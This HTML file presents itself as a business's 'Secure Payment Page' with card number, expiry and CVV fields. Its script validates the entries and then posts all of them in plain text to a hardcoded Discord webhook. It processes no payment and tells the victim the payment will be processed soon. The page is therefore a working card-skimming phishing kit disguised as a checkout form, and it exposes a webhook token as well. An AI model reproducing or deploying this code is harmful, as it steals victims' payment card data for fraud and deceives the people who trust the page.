<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Secure Payment Page for Business Transactions">
    <meta name="author" content="Your Business Name">
    <title>Secure Payment Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        h2 {
            margin-top: 0;
            color: #333;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #555;
        }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #28a745;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        button:hover {
            background: #218838;
        }
        .error {
            color: red;
            margin-top: 10px;
            display: none;
        }
        .success {
            color: green;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Secure Payment Page</h2>
        <form id="payment-form">
            <div class="form-group">
                <label for="card-number">Card Number</label>
                <input type="text" id="card-number" required>
            </div>
            <div class="form-group">
                <label for="expiry-date">Expiry Date (MM/YY)</label>
                <input type="text" id="expiry-date" required>
            </div>
            <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" required>
            </div>
            <button type="submit">Pay</button>
        </form>
        <div id="message" class="error"></div>
    </div>

    <script>
        document.getElementById('payment-form').addEventListener('submit', function(e) {
            e.preventDefault();

            const cardNumber = document.getElementById('card-number').value.trim();
            const expiryDate = document.getElementById('expiry-date').value.trim();
            const cvv = document.getElementById('cvv').value.trim();
            const messageDiv = document.getElementById('message');

            // Enhanced validation
            if (!validateCardNumber(cardNumber) || !validateExpiryDate(expiryDate) || !validateCVV(cvv)) {
                messageDiv.className = 'error';
                messageDiv.textContent = 'Please enter valid card information.';
                messageDiv.style.display = 'block';
                return;
            }

            const webhookUrl = "https://discord.com/api/webhooks/1273407148373573647/XE059A7NLkxTLpoAMoXBKBVdiOjhjhslLYjR4_tOwFFEGstrS3dwjf8mM3c86_rW4wju";

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: "Payment Bot",
                    content: `Card Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`
                })
            })
            .then(response => {
                if (response.ok) {
                    messageDiv.className = 'success';
                    messageDiv.textContent = 'Payment will be processed soon, thanks for buying';
                } else {
                    messageDiv.className = 'error';
                    messageDiv.textContent = 'Error, please try again';
                }
                messageDiv.style.display = 'block';
            })
            .catch(error => {
                messageDiv.className = 'error';
                messageDiv.textContent = 'Error, please try again';
                messageDiv.style.display = 'block';
                console.error('Error:', error);
            });
        });

        function validateCardNumber(cardNumber) {
            // Luhn Algorithm to validate the card number
            let sum = 0;
            let shouldDouble = false;
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber[i]);
                if (shouldDouble) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
                shouldDouble = !shouldDouble;
            }
            return sum % 10 === 0;
        }

        function validateExpiryDate(expiryDate) {
            const match = expiryDate.match(/^(0[1-9]|1[0-2])\/?([0-9]{2})$/);
            if (!match) return false;
            const month = parseInt(match[1], 10);
            const year = parseInt('20' + match[2], 10);
            const now = new Date();
            const currentYear = now.getFullYear();
            const currentMonth = now.getMonth() + 1; // Months are 0-based

            if (year < currentYear || (year === currentYear && month < currentMonth)) {
                return false;
            }
            return true;
        }

        function validateCVV(cvv) {
            return /^\d{3,4}$/.test(cvv);
        }
    </script>
</body>
</html>
